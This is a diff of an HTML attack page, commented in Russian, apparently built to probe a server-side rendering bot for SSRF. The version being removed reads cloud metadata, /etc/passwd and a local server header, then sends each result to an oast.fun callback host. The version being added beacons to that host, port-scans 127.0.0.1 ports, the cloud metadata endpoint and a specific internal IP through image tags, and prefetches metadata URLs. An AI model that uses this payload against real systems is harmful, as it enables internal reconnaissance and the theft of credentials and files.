@@ -1,38 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Impact Search</title>
+    <title>Impact Search v4</title>
 </head>
 <body>
     <script>
         const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
 
-        // Функция для отправки награбленного тебе
-        function sendLeakedData(key, data) {
-            fetch(`${oast}/leak?${key}=${btoa(data)}`);
+        // Функция-репортер
+        function report(path) {
+            var img = new Image();
+            img.src = oast + "/" + path + "?rand=" + Math.random();
         }
 
-        // 1. Пытаемся прочитать метаданные облака (если это VK Cloud/OpenStack)
-        fetch("http://169.254.169.254/latest/meta-data/hostname")
-            .then(r => r.text())
-            .then(t => sendLeakedData("cloud_host", t))
-            .catch(e => fetch(`${oast}/err_cloud`));
+        // 1. Проверяем, жив ли сам JS в боте
+        report("js_is_alive");
 
-        // 2. Пытаемся прочитать локальный файл через классический SSRF вектор
-        // (Работает, если Chrome запущен с флагом --allow-file-access-from-files)
-        fetch("file:///etc/passwd")
-            .then(r => r.text())
-            .then(t => sendLeakedData("passwd", t))
-            .catch(e => fetch(`${oast}/err_file`));
+        // 2. Сканируем внутренние порты через теги img
+        // Если порт открыт, сработает onload или хотя бы придет попытка запроса
+        const targets = [
+            { name: "localhost_80", url: "http://127.0.0.1:80/favicon.ico" },
+            { name: "localhost_8080", url: "http://127.0.0.1:8080/favicon.ico" },
+            { name: "cloud_metadata", url: "http://169.254.169.254/latest/meta-data/" },
+            { name: "internal_kittenx", url: "http://31.177.104.115:80/" }
+        ];
 
-        // 3. Просто дергаем локалхост и смотрим заголовок сервера
-        fetch("http://127.0.0.1:80")
-            .then(r => {
-                const server = r.headers.get("Server");
-                sendLeakedData("local_server", server || "unknown");
-            });
+        targets.forEach(target => {
+            var probe = new Image();
+            probe.onload = function() { report("OPEN_" + target.name); };
+            probe.onerror = function() { report("HIT_OR_CLOSED_" + target.name); };
+            probe.src = target.url;
+        });
     </script>
-    
-    <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+
+    <img src="http://127.0.0.1/forced_internal_hit">
+    <link rel="prefetch" href="http://169.254.169.254/latest/meta-data/">
 </body>
 </html>
